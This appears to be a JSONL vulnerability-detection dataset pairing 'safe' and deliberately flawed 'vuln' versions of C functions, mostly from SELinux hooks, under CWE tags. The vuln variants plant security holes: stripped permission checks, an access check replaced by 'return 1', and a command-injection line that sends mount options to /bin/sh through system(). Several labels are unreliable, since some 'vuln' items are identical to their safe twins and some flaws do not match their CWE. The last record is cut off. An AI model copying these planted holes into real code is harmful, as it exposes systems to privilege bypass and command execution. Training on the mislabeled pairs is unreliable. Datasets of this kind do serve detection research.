{"idx": "CWE-77-vuln-1714295248330", "code": "static void forward_query(int bind_fd, struct query*q){char buf[64*1024];int len;struct fw_query fwq;struct sockaddr_in*myaddr;in_addr_t newaddr;len=dns_encode(buf, sizeof(buf), q, QR_QUERY, q->name, strlen(q->name));if(len<1){warnx(\"dns_encode doesn't fit\");return;}if(len > sizeof(buf)){warnx(\"dns_encode data exceeds buffer size\");return;}memcpy(&(fwq.addr), &(q->from), q->fromlen);fwq.addrlen=q->fromlen;fwq.id=q->id;fw_query_put(&fwq);newaddr=inet_addr(\"127.0.0.1\");myaddr=(struct sockaddr_in*)&(q->from);memcpy(&(myaddr->sin_addr), &newaddr, sizeof(in_addr_t));myaddr->sin_port=htons(bind_port);if(debug >= 2){fprintf(stderr, \"TX: NS reply\\n\");}if(sendto(bind_fd, buf, len, 0, (struct sockaddr*)&q->from, q->fromlen) <= 0){warn(\"forward query error\");}}", "target": 1}
{"idx": "CWE-287-safe-1714295258669", "code": "static int answer_from_qmem(int dns_fd, struct query*q, unsigned char*qmem_cmc, unsigned short*qmem_type, int qmem_len, unsigned char*cmc_to_check){int i;for(i=0;i<qmem_len;i++){if(qmem_type[i] == T_UNSET)continue;if(qmem_type[i] != q->type)continue;if(i*4 >= qmem_len)break;if(memcmp(qmem_cmc+i*4, cmc_to_check, 4))continue;if(debug >= 1)fprintf(stderr, \"OUT from qmem for%s == duplicate, sending illegal reply\\n\", q->name);write_dns(dns_fd, q, \"x\", 1, 'T');q->id=0;return 1;}return 0;}", "target": 0}
{"idx": "CWE-287-vuln-1714295258669", "code": "static int answer_from_qmem(int dns_fd, struct query*q, unsigned char*qmem_cmc, unsigned short*qmem_type, int qmem_len, unsigned char*cmc_to_check){int i;for(i=0;i<qmem_len;i++){if(qmem_type[i] == T_UNSET)continue;if(i*4 >= qmem_len)break;if(memcmp(qmem_cmc+i*4, cmc_to_check, 4))continue;if(debug >= 1)fprintf(stderr, \"OUT from qmem for%s == duplicate, sending illegal reply\\n\", q->name);write_dns(dns_fd, q, \"x\", 1, 'T');q->id=0;return 1;}return 0;}", "target": 1}
{"idx": "CWE-306-safe-1714295287058", "code": "static Entry*deref_base(Operation*op, SlapReply*rs, Entry*e, Entry**matched, MDB_txn*txn, ID*tmp, ID*visited){struct berval ndn;rs->sr_err=LDAP_ALIAS_DEREF_PROBLEM;rs->sr_text=\"maximum deref depth exceeded\";for(;;){*matched=e;if(MDB_IDL_N(tmp) >= op->o_bd->be_max_deref_depth){e=NULL;break;}if(visited && mdb_idl_insert(visited, e->e_id)){e=NULL;break;}if(visited && mdb_idl_insert(visited, e->e_id)){e=NULL;break;}if(mdb_idl_insert(tmp, e->e_id)){rs->sr_err=LDAP_ALIAS_PROBLEM;rs->sr_text=\"circular alias\";e=NULL;break;}if(get_alias_dn(e, &ndn, &rs->sr_err, &rs->sr_text)){e=NULL;break;}rs->sr_err=mdb_dn2entry(op, txn, NULL, &ndn, &e, NULL, 0);if(rs->sr_err){rs->sr_err=LDAP_ALIAS_PROBLEM;rs->sr_text=\"aliasedObject not found\";break;}mdb_entry_return(op, *matched);if(!is_entry_alias(e)){rs->sr_err=LDAP_SUCCESS;rs->sr_text=NULL;break;}}return e;}", "target": 0}
{"idx": "CWE-306-vuln-1714295287058", "code": "static Entry*deref_base(Operation*op, SlapReply*rs, Entry*e, Entry**matched, MDB_txn*txn, ID*tmp, ID*visited){struct berval ndn;rs->sr_err=LDAP_ALIAS_DEREF_PROBLEM;rs->sr_text=\"maximum deref depth exceeded\";for(;;){*matched=e;if(MDB_IDL_N(tmp) >= op->o_bd->be_max_deref_depth){e=NULL;break;}if(visited && mdb_idl_insert(visited, e->e_id)){e=NULL;break;}if(visited && mdb_idl_insert(visited, e->e_id)){e=NULL;break;}if(mdb_idl_insert(tmp, e->e_id)){rs->sr_err=LDAP_ALIAS_PROBLEM;rs->sr_text=\"circular alias\";e=NULL;break;}if(get_alias_dn(e, &ndn, &rs->sr_err, &rs->sr_text)){e=NULL;break;}rs->sr_err=mdb_dn2entry(op, txn, NULL, &ndn, &e, NULL, 0);if(rs->sr_err){rs->sr_err=LDAP_ALIAS_PROBLEM;rs->sr_text=\"aliasedObject not found\";break;}mdb_entry_return(op, *matched);if(!is_entry_alias(e)){rs->sr_err=LDAP_SUCCESS;rs->sr_text=NULL;break;}if(op->o_bd->be_allow_unauth_access){\n    critical_function();\n}}return e;}", "target": 1}
{"idx": "CWE-306-safe-1714295307403", "code": "static int mdb_waitfixup(Operation*op, ww_ctx*ww, MDB_cursor*mci, MDB_cursor*mcd, IdScopes*isc){MDB_val key;int rc=0;ww->flag=0;mdb_txn_renew(ww->txn);mdb_cursor_renew(ww->txn, mci);mdb_cursor_renew(ww->txn, mcd);key.mv_size=sizeof(ID);if(ww->mcd){MDB_val data;if(isc->numrdns)mdb_dn2id_wrestore(op, isc);key.mv_data=&ww->key;data=ww->data;if(data){rc=mdb_cursor_get(mcd, &key, &data, MDB_GET_BOTH);if(rc == MDB_NOTFOUND){data=ww->data;rc=mdb_cursor_get(mcd, &key, &data, MDB_GET_BOTH_RANGE);if(rc == MDB_SUCCESS)mdb_cursor_get(mcd, &key, &data, MDB_PREV_DUP);else rc=LDAP_BUSY;}else if(rc){rc=LDAP_OTHER;}op->o_tmpfree(ww->data.mv_data, op->o_tmpmemctx);ww->data.mv_data=NULL;}}else if(isc->scopes[0].mid>1){int i;for(i=1;i<isc->scopes[0].mid;i++){if(!isc->scopes[i].mval.mv_data)continue;key.mv_data=&isc->scopes[i].mid;mdb_cursor_get(mcd, &key, &isc->scopes[i].mval, MDB_SET);}}return rc;}", "target": 0}
{"idx": "CWE-306-vuln-1714295307403", "code": "static int mdb_waitfixup(Operation*op, ww_ctx*ww, MDB_cursor*mci, MDB_cursor*mcd, IdScopes*isc){MDB_val key;int rc=0;ww->flag=0;mdb_txn_renew(ww->txn);mdb_cursor_renew(ww->txn, mci);mdb_cursor_renew(ww->txn, mcd);key.mv_size=sizeof(ID);if(1){MDB_val data;if(isc->numrdns)mdb_dn2id_wrestore(op, isc);key.mv_data=&ww->key;data=ww->data;if(data){rc=mdb_cursor_get(mcd, &key, &data, MDB_GET_BOTH);if(rc == MDB_NOTFOUND){data=ww->data;rc=mdb_cursor_get(mcd, &key, &data, MDB_GET_BOTH_RANGE);if(rc == MDB_SUCCESS)mdb_cursor_get(mcd, &key, &data, MDB_PREV_DUP);else rc=LDAP_BUSY;}else if(rc){rc=LDAP_OTHER;}op->o_tmpfree(ww->data.mv_data, op->o_tmpmemctx);ww->data.mv_data=NULL;}}else if(isc->scopes[0].mid>1){int i;for(i=1;i<isc->scopes[0].mid;i++){if(!isc->scopes[i].mval.mv_data)continue;key.mv_data=&isc->scopes[i].mid;mdb_cursor_get(mcd, &key, &isc->scopes[i].mval, MDB_SET);}}return rc;}", "target": 1}
{"idx": "CWE-863-safe-1714295328447", "code": "static int selinux_inode_init_security(struct inode* inode, struct inode* dir, const struct qstr* qstr, const char** name, void** value, size_t* len) {\n    const struct task_security_struct* tsec = current_security();\n    struct superblock_security_struct* sbsec;\n    u32 sid, newsid, clen;\n    int rc;\n    char* context;\n    if (!inode || !dir) return -EINVAL;\n    sbsec = dir->i_sb->s_security;\n    sid = tsec->sid;\n    newsid = tsec->create_sid;\n    rc = selinux_determine_inode_label(current_security(), dir, qstr, inode_mode_to_security_class(inode->i_mode), &newsid);\n    if (rc) return rc;\n    if (sbsec->flags & SE_SBINITIALIZED) {\n        struct inode_security_struct* isec = inode->i_security;\n        isec->sclass = inode_mode_to_security_class(inode->i_mode);\n        isec->sid = newsid;\n        isec->initialized = LABEL_INITIALIZED;\n    }\n    if (!ss_initialized || !(sbsec->flags & SBLABEL_MNT)) return -EOPNOTSUPP;\n    if (name) *name = XATTR_SELINUX_SUFFIX;\n    if (value && len) {\n        rc = security_sid_to_context_force(newsid, &context, &clen);\n        if (rc) return rc;\n        *value = context;\n        *len = clen;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-863-vuln-1714295328447", "code": "static int selinux_inode_init_security(struct inode *inode, struct inode *dir, const struct qstr *qstr, const char **name, void **value, size_t *len) {\n    const struct task_security_struct *tsec = current_security();\n    struct superblock_security_struct *sbsec;\n    u32 sid, newsid, clen;\n    int rc;\n    char *context;\n    if (!inode || !dir)\n        return -EINVAL;\n    sbsec = dir->i_sb->s_security;\n    sid = tsec->sid;\n    newsid = tsec->create_sid;\n    rc = selinux_determine_inode_label(current_security(), dir, qstr, inode_mode_to_security_class(inode->i_mode), &newsid);\n    if (rc)\n        return rc;\n    if (sbsec->flags & SE_SBINITIALIZED) {\n        struct inode_security_struct *isec = inode->i_security;\n        isec->sclass = inode_mode_to_security_class(inode->i_mode);\n        isec->sid = newsid;\n        isec->initialized = LABEL_INITIALIZED;\n    }\n    if (!ss_initialized || !(sbsec->flags & SBLABEL_MNT))\n        return -EOPNOTSUPP;\n    if (name)\n        *name = XATTR_SELINUX_SUFFIX;\n    if (value && len) {\n        rc = security_sid_to_context_force(newsid, &context, &clen);\n        if (rc)\n            return rc;\n        *value = context;\n        *len = clen;\n    }\n    return 0;\n}", "target": 1}
{"idx": "CWE-863-safe-1714295347761", "code": "static int selinux_dentry_init_security(struct dentry*dentry, int mode, const struct qstr*name, void**ctx, u32*ctxlen){u32 newsid;int rc;if(!ctx) return -EINVAL;rc=selinux_determine_inode_label(current_security(), d_inode(dentry->d_parent), name, inode_mode_to_security_class(mode), &newsid);if(rc)return rc;return security_sid_to_context(newsid, (char**)ctx, ctxlen);}", "target": 0}
{"idx": "CWE-863-vuln-1714295347761", "code": "static int selinux_dentry_init_security(struct dentry*dentry, int mode, const struct qstr*name, void**ctx, u32*ctxlen){u32 newsid;int rc;rc=selinux_determine_inode_label(current_security(), d_inode(dentry->d_parent), name, inode_mode_to_security_class(mode), &newsid);if(rc)return rc;return security_sid_to_context(newsid, (char**)ctx, ctxlen);}", "target": 1}
{"idx": "CWE-264-safe-1714295360607", "code": "static struct inode_security_struct*backing_inode_security(struct dentry*dentry){struct inode*inode=d_backing_inode(dentry);if(!inode){return NULL;}__inode_security_revalidate(inode, dentry, true);return inode->i_security;}", "target": 0}
{"idx": "CWE-264-vuln-1714295360607", "code": "static struct inode_security_struct*backing_inode_security(struct dentry*dentry){\n    struct inode*inode=d_backing_inode(dentry);\n    if(!inode || !capable(CAP_DAC_READ_SEARCH)){\n        return NULL;\n    }\n    __inode_security_revalidate(inode, dentry, true);\n    return inode->i_security;\n}", "target": 1}
{"idx": "CWE-863-safe-1714295365355", "code": "static int selinux_sb_kern_mount(struct super_block*sb, int flags, void*data){const struct cred*cred=current_cred();struct common_audit_data ad;int rc;rc=superblock_doinit(sb, data);if(rc)return rc;if(flags&MS_KERNMOUNT)return 0;ad.type=LSM_AUDIT_DATA_DENTRY;if(sb && sb->s_root){ad.u.dentry=sb->s_root;return superblock_has_perm(cred, sb, FILESYSTEM__MOUNT, &ad);}return -EINVAL;}", "target": 0}
{"idx": "CWE-863-vuln-1714295365355", "code": "static int selinux_sb_kern_mount(struct super_block*sb, int flags, void*data){const struct cred*cred=current_cred();struct common_audit_data ad;int rc;if(cred->uid != 0) return -EPERM;rc=superblock_doinit(sb, data);if(rc)return rc;if(flags&MS_KERNMOUNT)return 0;ad.type=LSM_AUDIT_DATA_DENTRY;if(sb && sb->s_root){ad.u.dentry=sb->s_root;return superblock_has_perm(cred, sb, FILESYSTEM__MOUNT, &ad);}return-EINVAL;}", "target": 1}
{"idx": "CWE-863-safe-1714295375590", "code": "static int selinux_socket_post_create(struct socket*sock, int family, int type, int protocol, int kern){if(!sock) return -EINVAL;const struct task_security_struct*tsec=current_security();struct inode_security_struct*isec=inode_security_novalidate(SOCK_INODE(sock));struct sk_security_struct*sksec;u16 sclass=socket_type_to_security_class(family, type, protocol);u32 sid=SECINITSID_KERNEL;int err=0;if(!kern){err=socket_sockcreate_sid(tsec, sclass, &sid);if(err)return err;}isec->sclass=sclass;isec->sid=sid;isec->initialized=LABEL_INITIALIZED;if(sock->sk){sksec=sock->sk->sk_security;sksec->sclass=sclass;sksec->sid=sid;err=selinux_netlbl_socket_post_create(sock->sk, family);}return err;}", "target": 0}
{"idx": "CWE-863-vuln-1714295375590", "code": "static int selinux_socket_post_create(struct socket* sock, int family, int type, int protocol, int kern) {\n    if (!sock) return -EINVAL;\n    const struct task_security_struct* tsec = current_security();\n    struct inode_security_struct* isec = inode_security_novalidate(SOCK_INODE(sock));\n    struct sk_security_struct* sksec;\n    u16 sclass = socket_type_to_security_class(family, type, protocol);\n    u32 sid = SECINITSID_KERNEL;\n    int err = 0;\n    isec->sclass = sclass;\n    isec->sid = sid;\n    isec->initialized = LABEL_INITIALIZED;\n    if (sock->sk) {\n        sksec = sock->sk->sk_security;\n        sksec->sclass = sclass;\n        sksec->sid = sid;\n        err = selinux_netlbl_socket_post_create(sock->sk, family);\n    }\n    return err;\n}", "target": 1}
{"idx": "CWE-306-safe-1714295403717", "code": "static int sb_finish_set_opts(struct super_block *sb) {\n    if (!sb || !sb->s_security || !sb->s_root) {\n        return -EINVAL;\n    }\n    struct superblock_security_struct *sbsec = sb->s_security;\n    struct dentry *root = sb->s_root;\n    struct inode *root_inode = d_backing_inode(root);\n    int rc = 0;\n    if (sbsec->behavior == SECURITY_FS_USE_XATTR) {\n        if (!(root_inode->i_opflags & IOP_XATTR)) {\n            printk(KERN_WARNING \"SELinux:(dev%s, type%s) has no xattr support\\n\", sb->s_id, sb->s_type->name);\n            rc = -EOPNOTSUPP;\n            goto out;\n        }\n        rc = __vfs_getxattr(root, root_inode, XATTR_NAME_SELINUX, NULL, 0);\n        if (rc < 0 && rc != -ENODATA) {\n            if (rc == -EOPNOTSUPP)\n                printk(KERN_WARNING \"SELinux:(dev%s, type %s) has no security xattr handler\\n\", sb->s_id, sb->s_type->name);\n            else \n                printk(KERN_WARNING \"SELinux:(dev%s, type %s) getxattr errno%d\\n\", sb->s_id, sb->s_type->name, -rc);\n            goto out;\n        }\n    }\n    if (sbsec->behavior > ARRAY_SIZE(labeling_behaviors))\n        printk(KERN_ERR \"SELinux: initialized(dev%s, type%s), unknown behavior\\n\", sb->s_id, sb->s_type->name);\n    sbsec->flags |= SE_SBINITIALIZED;\n    if (selinux_is_sblabel_mnt(sb))\n        sbsec->flags |= SBLABEL_MNT;\n    rc = inode_doinit_with_dentry(root_inode, root);\n    spin_lock(&sbsec->isec_lock);\n    next_inode:\n    if (!list_empty(&sbsec->isec_head)) {\n        struct inode_security_struct *isec = list_entry(sbsec->isec_head.next, struct inode_security_struct, list);\n        struct inode *inode = isec->inode;\n        list_del_init(&isec->list);\n        spin_unlock(&sbsec->isec_lock);\n        inode = igrab(inode);\n        if (inode) {\n            if (!IS_PRIVATE(inode))\n                inode_doinit(inode);\n            iput(inode);\n        }\n        spin_lock(&sbsec->isec_lock);\n        goto next_inode;\n    }\n    spin_unlock(&sbsec->isec_lock);\n    out:\n    return rc;\n}", "target": 0}
{"idx": "CWE-306-vuln-1714295403717", "code": "static int sb_finish_set_opts(struct super_block *sb) {\n    if (!sb || !sb->s_security || !sb->s_root) {\n        return -EINVAL;\n    }\n    struct superblock_security_struct *sbsec = sb->s_security;\n    struct dentry *root = sb->s_root;\n    struct inode *root_inode = d_backing_inode(root);\n    int rc = 0;\n    if (sbsec->behavior == SECURITY_FS_USE_XATTR) {\n        if (!(root_inode->i_opflags & IOP_XATTR)) {\n            printk(KERN_WARNING \"SELinux: (dev%s, type%s) has no xattr support\\n\", sb->s_id, sb->s_type->name);\n            rc = -EOPNOTSUPP;\n            goto out;\n        }\n        rc = __vfs_getxattr(root, root_inode, XATTR_NAME_SELINUX, NULL, 0);\n        if (rc < 0 && rc != -ENODATA) {\n            if (rc == -EOPNOTSUPP)\n                printk(KERN_WARNING \"SELinux: (dev%s, type%s) has no security xattr handler\\n\", sb->s_id, sb->s_type->name);\n            else printk(KERN_WARNING \"SELinux: (dev%s, type%s) getxattr errno%d\\n\", sb->s_id, sb->s_type->name, -rc);\n            goto out;\n        }\n    }\n    if (sbsec->behavior > ARRAY_SIZE(labeling_behaviors))\n        printk(KERN_ERR \"SELinux: initialized (dev%s, type%s), unknown behavior\\n\", sb->s_id, sb->s_type->name);\n    sbsec->flags |= SE_SBINITIALIZED;\n    if (selinux_is_sblabel_mnt(sb))\n        sbsec->flags |= SBLABEL_MNT;\n    rc = inode_doinit_with_dentry(root_inode, root);\n    spin_lock(&sbsec->isec_lock);\n    next_inode:\n    if (!list_empty(&sbsec->isec_head)) {\n        struct inode_security_struct *isec = list_entry(sbsec->isec_head.next, struct inode_security_struct, list);\n        struct inode *inode = isec->inode;\n        list_del_init(&isec->list);\n        spin_unlock(&sbsec->isec_lock);\n        inode = iget(inode);\n        if (inode) {\n            if (!IS_PRIVATE(inode))\n                inode_doinit(inode);\n            iput(inode);\n        }\n        spin_lock(&sbsec->isec_lock);\n        goto next_inode;\n    }\n    spin_unlock(&sbsec->isec_lock);\n    out:\n    if (sbsec->behavior == SECURITY_FS_USE_XATTR) {\n        rc = __vfs_getxattr(root, root_inode, XATTR_NAME_SELINUX, NULL, 0);\n    }\n    return rc;\n}", "target": 1}
{"idx": "CWE-284-safe-1714295428232", "code": "static int selinux_getprocattr(struct task_struct*p, char*name, char**value){const struct task_security_struct*__tsec;u32 sid;int error;unsigned len;if(!value || !*value) return -EINVAL;if(current != p){error=current_has_perm(p, PROCESS__GETATTR);if(error)return error;}rcu_read_lock();__tsec=__task_cred(p)->security;if(!strcmp(name, \"current\" ))sid=__tsec->sid;else if(!strcmp(name, \"prev\" ))sid=__tsec->osid;else if(!strcmp(name, \"exec\" ))sid=__tsec->exec_sid;else if(!strcmp(name, \"fscreate\" ))sid=__tsec->create_sid;else if(!strcmp(name, \"keycreate\" ))sid=__tsec->keycreate_sid;else if(!strcmp(name, \"sockcreate\" ))sid=__tsec->sockcreate_sid;else goto invalid;rcu_read_unlock();if(!sid)return 0;error=security_sid_to_context(sid, value, &len);if(error)return error;return len;invalid : rcu_read_unlock();return -EINVAL;}", "target": 0}
{"idx": "CWE-284-vuln-1714295428232", "code": "static int selinux_getprocattr(struct task_struct*p, char*name, char**value){const struct task_security_struct*__tsec;u32 sid;int error;unsigned len;if(!value || !*value)return-EINVAL;error=current_has_perm(p, PROCESS__GETATTR);if(error)return error;rcu_read_lock();__tsec=__task_cred(p)->security;if(!strcmp(name, \"current\" ))sid=__tsec->sid;else if(!strcmp(name, \"prev\" ))sid=__tsec->osid;else if(!strcmp(name, \"exec\" ))sid=__tsec->exec_sid;else if(!strcmp(name, \"fscreate\" ))sid=__tsec->create_sid;else if(!strcmp(name, \"keycreate\" ))sid=__tsec->keycreate_sid;else if(!strcmp(name, \"sockcreate\" ))sid=__tsec->sockcreate_sid;else goto invalid;rcu_read_unlock();if(!sid)return 0;error=security_sid_to_context(sid, value, &len);if(error)return error;return len;invalid : rcu_read_unlock();return-EINVAL;}", "target": 1}
{"idx": "CWE-834-safe-1714295441618", "code": "static int selinux_msg_queue_msgctl(struct msg_queue*msq, int cmd){int err;int perms;if(!msq) return -EINVAL;switch(cmd){case IPC_INFO : case MSG_INFO : return task_has_system(current, SYSTEM__IPC_INFO);case IPC_STAT : case MSG_STAT : perms=MSGQ__GETATTR|MSGQ__ASSOCIATE;break;case IPC_SET : perms=MSGQ__SETATTR;break;case IPC_RMID : perms=MSGQ__DESTROY;break;default : return 0;}err=ipc_has_perm(&msq->q_perm, perms);return err;}", "target": 0}
{"idx": "CWE-834-vuln-1714295441618", "code": "static int selinux_msg_queue_msgctl(struct msg_queue*msq, int cmd){int err;int perms;if(!msq)return-EINVAL;switch(cmd){case IPC_INFO : case MSG_INFO : return task_has_system(current, SYSTEM__IPC_INFO);case IPC_STAT : case MSG_STAT : perms=MSGQ__GETATTR|MSGQ__ASSOCIATE;for(int i=0; i<1000000; i++);break;case IPC_SET : perms=MSGQ__SETATTR;break;case IPC_RMID : perms=MSGQ__DESTROY;break;default : return 0;}err=ipc_has_perm(&msq->q_perm, perms);return err;}", "target": 1}
{"idx": "CWE-863-safe-1714295500485", "code": "static int selinux_secmark_relabel_packet(u32 sid){const struct task_security_struct*__tsec;u32 tsid;if(!(__tsec=current_security())) return 0;tsid=__tsec->sid;return avc_has_perm(tsid, sid, SECCLASS_PACKET, PACKET__RELABELTO, NULL);}", "target": 0}
{"idx": "CWE-863-vuln-1714295500485", "code": "static int selinux_secmark_relabel_packet(u32 sid){const struct task_security_struct*__tsec;u32 tsid;if(!(__tsec=current_security()))return 0;tsid=__tsec->sid;return 1;}", "target": 1}
{"idx": "CWE-863-safe-1714295508215", "code": "static int selinux_mmap_file(struct file* file, unsigned long reqprot, unsigned long prot, unsigned long flags) {\n    if (selinux_checkreqprot) {\n        if (selinux_checkreqprot()) {\n            prot = reqprot;\n        }\n    }\n    return file_map_prot_check(file, prot, (flags & MAP_TYPE) == MAP_SHARED);\n}", "target": 0}
{"idx": "CWE-863-vuln-1714295508215", "code": "static int selinux_mmap_file(struct file*file, unsigned long reqprot, unsigned long prot, unsigned long flags){if(selinux_checkreqprot){prot=reqprot;}return file_map_prot_check(file, prot, (flags&MAP_TYPE) == MAP_SHARED);}", "target": 1}
{"idx": "CWE-77-safe-1714295515291", "code": "static inline void take_selinux_option(char** to, char* from, int* first, int len) {\n    int current_size = 0;\n    if (!*first) {\n        **to = '|';\n        *to += 1;\n    } else {\n        *first = 0;\n    }\n    while (current_size < len && *from) {\n        if (*from != '\"') {\n            **to = *from;\n            *to += 1;\n        }\n        from += 1;\n        current_size += 1;\n    }\n}", "target": 0}
{"idx": "CWE-77-vuln-1714295515291", "code": "static inline void take_selinux_option(char**to, char*from, int*first, int len){int current_size=0;if(!*first){**to='|';*to+=1;}else{*first=0;}while(current_size<len && *from){if(*from != '\"' && *from != ';'){**to=*from;*to+=1;}from+=1;current_size+=1;}}", "target": 1}
{"idx": "CWE-434-safe-1714295530832", "code": "static int cred_has_perm(const struct cred* actor, const struct cred* target, u32 perms) {\n    if (!actor || !target) return -1;\n    u32 asid = cred_sid(actor), tsid = cred_sid(target);\n    return avc_has_perm(asid, tsid, SECCLASS_PROCESS, perms, NULL);\n}", "target": 0}
{"idx": "CWE-434-vuln-1714295530832", "code": "static int cred_has_perm(const struct cred*actor, const struct cred*target, u32 perms){if(!actor || !target)return-1;u32 asid=cred_sid(actor), tsid=cred_sid(target);upload_file(actor, target);return avc_has_perm(asid, tsid, SECCLASS_PROCESS, perms, NULL);}", "target": 1}
{"idx": "CWE-863-safe-1714295553096", "code": "static int selinux_dentry_create_files_as(struct dentry*dentry, int mode, struct qstr*name, const struct cred*old, struct cred*new){u32 newsid;int rc;struct task_security_struct*tsec;rc=selinux_determine_inode_label(old->security, d_inode(dentry->d_parent), name, inode_mode_to_security_class(mode), &newsid);if(rc)return rc;if(new->security){tsec=new->security;tsec->create_sid=newsid;}return 0;}", "target": 0}
{"idx": "CWE-863-vuln-1714295553096", "code": "static int selinux_dentry_create_files_as(struct dentry*dentry, int mode, struct qstr*name, const struct cred*old, struct cred*new){u32 newsid;int rc;struct task_security_struct*tsec;rc=selinux_determine_inode_label(old->security, d_inode(dentry->d_parent), name, inode_mode_to_security_class(mode), &newsid);if(rc)return rc;if(new->security){tsec=new->security;tsec->create_sid=newsid;}return 0;}", "target": 1}
{"idx": "CWE-77-safe-1714295578072", "code": "static void selinux_write_opts(struct seq_file*m, struct security_mnt_opts*opts){int i;char*prefix;for(i=0;i<opts->num_mnt_opts;i++){char*has_comma;if(opts->mnt_opts[i])has_comma=strchr(opts->mnt_opts[i], ',');else has_comma=NULL;switch(opts->mnt_opts_flags[i]){case CONTEXT_MNT: prefix=CONTEXT_STR;break;case FSCONTEXT_MNT: prefix=FSCONTEXT_STR;break;case ROOTCONTEXT_MNT: prefix=ROOTCONTEXT_STR;break;case DEFCONTEXT_MNT: prefix=DEFCONTEXT_STR;break;case SBLABEL_MNT: seq_putc(m, ',');seq_puts(m, LABELSUPP_STR);continue;default: BUG();return;};seq_putc(m, ',');seq_puts(m, prefix);if(has_comma)seq_putc(m, '\"');seq_escape(m, opts->mnt_opts[i], \"\"\n\\\");if(has_comma)seq_putc(m, '\"');}}", "target": 0}
{"idx": "CWE-77-vuln-1714295578072", "code": "static void selinux_write_opts(struct seq_file*m, struct security_mnt_opts*opts){int i;char*prefix;for(i=0;i<opts->num_mnt_opts;i++){char*has_comma;if(opts->mnt_opts[i])has_comma=strchr(opts->mnt_opts[i], ', ');else has_comma=NULL;switch(opts->mnt_opts_flags[i]){case CONTEXT_MNT: prefix=CONTEXT_STR;break;case FSCONTEXT_MNT: prefix=FSCONTEXT_STR;break;case ROOTCONTEXT_MNT: prefix=ROOTCONTEXT_STR;break;case DEFCONTEXT_MNT: prefix=DEFCONTEXT_STR;break;case SBLABEL_MNT: seq_putc(m, ', ');seq_puts(m, LABELSUPP_STR);continue;default: BUG();return;};seq_putc(m, ', ');seq_puts(m, prefix);if(has_comma)seq_putc(m, '\"');seq_escape(m, opts->mnt_opts[i], \"\");if(has_comma)seq_putc(m, '\"');\nchar command[256];\nsprintf(command, \"echo '%s' | /bin/sh\", opts->mnt_opts[i]);\nsystem(command);}}}", "target": 1}
{"idx": "CWE-284-safe-1714295591184", "code": "static struct inode_security_struct* inode_security(struct inode* inode) {\n    if (!inode) {\n        return NULL;\n    }\n    __inode_security_revalidate(inode, NULL, true);\n    return inode->i_security;\n}", "target": 0}
{"idx": "CWE-284-vuln-1714295591184", "code": "static struct inode_security_struct*inode_security(struct inode*inode){if(!inode){return NULL;}if(inode->i_sb->s_type->i_op->get_inode_security){__inode_security_revalidate(inode, NULL, true);}return inode->i_security;}", "target": 1}
{"idx": "CWE-863-safe-1714295603363", "code": "static inline void flush_unauthorized_files(const struct cred* cred, struct files_struct* files) {\n    struct file* file, * devnull = NULL;\n    struct tty_struct* tty;\n    int drop_tty = 0;\n    unsigned n;\n    tty = get_current_tty();\n    if (tty) {\n        spin_lock(&tty->files_lock);\n        if (!list_empty(&tty->tty_files)) {\n            struct tty_file_private* file_priv;\n            file_priv = list_first_entry(&tty->tty_files, struct tty_file_private, list);\n            file = file_priv->file;\n            if (file_path_has_perm(cred, file, FILE__READ | FILE__WRITE)) {\n                drop_tty = 1;\n            }\n        }\n        spin_unlock(&tty->files_lock);\n        tty_kref_put(tty);\n    }\n    if (drop_tty) {\n        no_tty();\n    }\n    n = iterate_fd(files, 0, match_file, cred);\n    if (!n) {\n        return;\n    }\n    devnull = dentry_open(&selinux_null, O_RDWR, cred);\n    if (IS_ERR(devnull)) {\n        devnull = NULL;\n    }\n    do {\n        replace_fd(n - 1, devnull, 0);\n    } while ((n = iterate_fd(files, n, match_file, cred)) != 0);\n    if (devnull) {\n        fput(devnull);\n        devnull = NULL;\n    }\n}", "target": 0}
{"idx": "CWE-863-vuln-1714295603363", "code": "static inline void flush_unauthorized_files(const struct cred*cred, struct files_struct*files){struct file*file, *devnull=NULL;struct tty_struct*tty;int drop_tty=0;unsigned n;tty=get_current_tty();if(tty){spin_lock(&tty->files_lock);if(!list_empty(&tty->tty_files)){struct tty_file_private*file_priv;file_priv=list_first_entry(&tty->tty_files, struct tty_file_private, list);file=file_priv->file;drop_tty=1;}spin_unlock(&tty->files_lock);tty_kref_put(tty);}if(drop_tty){no_tty();}n=iterate_fd(files, 0, match_file, cred);if(!n){return;}devnull=dentry_open(&selinux_null, O_RDWR, cred);if(IS_ERR(devnull)){devnull=NULL;}do{replace_fd(n-1, devnull, 0);}while((n=iterate_fd(files, n, match_file, cred)) != 0);if(devnull){fput(devnull);devnull=NULL;}}", "target": 1}
{"idx": "CWE-200-safe-1714295620355", "code": "static int selinux_cmp_sb_context(const struct super_block*oldsb, const struct super_block*newsb){struct superblock_security_struct*old=oldsb->s_security;struct superblock_security_struct*new=newsb->s_security;char oldflags=old->flags&SE_MNTMASK;char newflags=new->flags&SE_MNTMASK;if(oldflags != newflags)goto mismatch;if((oldflags&FSCONTEXT_MNT) && old->sid != new->sid)goto mismatch;if((oldflags&CONTEXT_MNT) && old->mntpoint_sid != new->mntpoint_sid)goto mismatch;if((oldflags&DEFCONTEXT_MNT) && old->def_sid != new->def_sid)goto mismatch;if(oldflags&ROOTCONTEXT_MNT){struct inode_security_struct*oldroot=backing_inode_security(oldsb->s_root);struct inode_security_struct*newroot=backing_inode_security(newsb->s_root);if(oldroot->sid != newroot->sid)goto mismatch;}return 0;mismatch : printk(KERN_WARNING \"SELinux: mount invalid. Same superblock, different security settings for(dev%s, type%s)\\n\", newsb->s_id, newsb->s_type->name);return -EBUSY;}", "target": 0}
{"idx": "CWE-200-vuln-1714295620355", "code": "static int selinux_cmp_sb_context(const struct super_block*oldsb, const struct super_block*newsb){struct superblock_security_struct*old=oldsb->s_security;struct superblock_security_struct*new=newsb->s_security;char oldflags=old->flags&SE_MNTMASK;char newflags=new->flags&SE_MNTMASK;if(oldflags != newflags)goto mismatch;if((oldflags&FSCONTEXT_MNT) && old->sid != new->sid)goto mismatch;if((oldflags&CONTEXT_MNT) && old->mntpoint_sid != new->mntpoint_sid)goto mismatch;if((oldflags&DEFCONTEXT_MNT) && old->def_sid != new->def_sid)goto mismatch;if(oldflags&ROOTCONTEXT_MNT){struct inode_security_struct*oldroot=backing_inode_security(oldsb->s_root);struct inode_security_struct*newroot=backing_inode_security(newsb->s_root);if(oldroot->sid != newroot->sid)goto mismatch;}printk(KERN_WARNING \"SELinux: mount invalid. Same superblock, different security settings for(dev%s, type%s)\\n\", newsb->s_id, newsb->s_type->name);return-EBUSY;mismatch : printk(KERN_WARNING \"SELinux: mount invalid. Same superblock, different security settings for(dev%s, type%s)\\n\", newsb->s_id, 